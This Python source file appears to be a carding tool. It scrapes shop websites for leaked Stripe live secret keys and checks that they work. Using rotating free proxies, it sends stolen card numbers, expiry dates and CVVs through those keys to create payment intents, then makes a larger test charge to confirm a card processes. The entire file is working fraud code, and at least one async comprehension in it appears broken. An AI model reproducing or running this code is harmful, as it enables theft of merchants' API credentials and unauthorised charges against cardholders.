import requests
import random
import re
import aiohttp
import asyncio
from luhn import is_valid
from bs4 import BeautifulSoup
from settings import PROXY_SOURCES, SHOP_LIST

proxies_list = []
keys_list = []
lock = asyncio.Lock()

async def refresh_proxies():
    global proxies_list
    all_px = []
    for url in PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=10)
            all_px.extend([p.strip() for p in resp.text.split('\n') if ':' in p])
        except: pass
    all_px = list(set(all_px))[:1000]
    
    live_px = []
    async with aiohttp.ClientSession() as session:
        tasks = [test_proxy(session, px) for px in all_px[:200]]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        live_px = [r for r in results if isinstance(r, str)]
    
    proxies_list = live_px[:50]
    print(f"Updated proxy pool: {len(proxies_list)} active")

async def test_proxy(session, px):
    try:
        proxy_url = f"http://{px}"
        async with session.get("http://httpbin.org/ip", proxy=proxy_url, timeout=5) as r:
            return px if r.status == 200 else None
    except: return None

async def scrape_keys():
    global keys_list
    new_keys = []
    async with aiohttp.ClientSession() as session:
        for shop in random.sample(SHOP_LIST, min(5, len(SHOP_LIST))):
            try:
                async with session.get(shop, timeout=10) as r:
                    if r.status == 200:
                        text = await r.text()
                        found = re.findall(r'sk_live_[0-9a-zA-Z]+', text)
                        new_keys.extend(set(found))
                        soup = BeautifulSoup(text, 'html.parser')
                        for script in soup.find_all('script'):
                            if script.string:
                                found = re.findall(r'sk_live_[0-9a-zA-Z]+', script.string)
                                new_keys.extend(set(found))
            except: pass
    
    live_new = [k async for k in [await test_key(k) for k in new_keys[:10]] if k]
    if live_new:
        keys_list.extend(live_new)
        keys_list = keys_list[-20:]
        print(f"Added {len(live_new)} new keys. Pool: {len(keys_list)}")

async def test_key(key):
    try:
        headers = {'Authorization': f'Bearer {key}'}
        resp = requests.post('https://api.stripe.com/v1/payment_intents', headers=headers, data={'amount':'1'}, timeout=10)
        return key if resp.status_code < 403 else None
    except: return None

async def get_proxies():
    if not proxies_list:
        await refresh_proxies()
    return proxies_list or ['']

async def get_keys():
    if not keys_list:
        await scrape_keys()
    return keys_list or ['dummy_key']

async def bin_info(bin_num):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'https://binlist.net/json/{bin_num}') as r:
                if r.status == 200:
                    data = await r.json()
                    scheme = data.get('scheme', '').lower()
                    return 'visa' in scheme or 'mastercard' in scheme, data.get('bank', {}).get('name', 'Unknown')
    except: pass
    return False, 'Unknown'

async def validate_data(data_str):
    global proxies_list, keys_list
    parts = re.split(r'[\|/ ]', data_str.strip())
    if len(parts) < 4: return "Invalid format. Use: num|mm|yy|cvv"
    num, mm, yy, cvv = parts[:4]
    
    if not is_valid(num) or not (1 <= int(mm) <= 12) or int(yy) < 26:
        return "Invalid checksum/format"
    
    bin6 = num[:6]
    valid_bin, bank = await bin_info(bin6)
    if not valid_bin: return f"Invalid BIN {bin6} ({bank})"
    
    px = random.choice(await get_proxies()) if proxies_list else None
    proxy_dict = {'http': f'http://{px}', 'https': f'http://{px}'} if px else None
    
    curr_keys = await get_keys()
    for key in curr_keys:
        try:
            auth_data = {
                'amount': '100', 'currency': 'usd',
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': num,
                'payment_method_data[card][exp_month]': mm,
                'payment_method_data[card][exp_year]': f'20{yy}',
                'payment_method_data[card][cvc]': cvv,
            }
            headers = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/x-www-form-urlencoded'}
            resp = requests.post('https://api.stripe.com/v1/payment_intents', data=auth_data, proxies=proxy_dict, headers=headers, timeout=15)
            if resp.status_code == 200 and 'requires_action' not in resp.text.lower():
                # Process higher amount
                proc_data = auth_data.copy(); proc_data['amount'] = '500'
                proc_resp = requests.post('https://api.stripe.com/v1/payment_intents', data=proc_data, proxies=proxy_dict, headers=headers, timeout=15)
                proc_status = " | Processed ✅" if proc_resp.status_code == 200 else " | Auth OK"
                if not await test_key(key):
                    keys_list = [k for k in keys_list if k != key]
                return f"Valid [{bank}] | BIN:{bin6}{proc_status}"
        except:
            if key in keys_list: keys_list.remove(key)
            continue
    return "All processors failed (auto-refreshing...)"

